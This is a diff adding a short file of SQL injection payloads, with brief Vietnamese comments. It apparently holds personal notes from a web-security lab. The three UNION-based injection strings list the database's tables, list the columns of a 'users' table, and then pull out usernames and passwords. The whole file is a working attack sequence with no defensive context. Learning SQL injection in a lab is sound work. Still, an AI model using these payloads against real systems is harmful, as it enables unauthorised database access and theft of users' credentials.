@@ -1,0 +1,8 @@
+#check xem trong database co nhung table nao
+1' union select null, table_name from information_Schema.tables;-- -
+
+#check cac cot co trong bang users
+1' union select 1, column_name from information_schema.columns where table_name='users'-- -
+
+#xem user + password
+1' union select user, password from users-- -
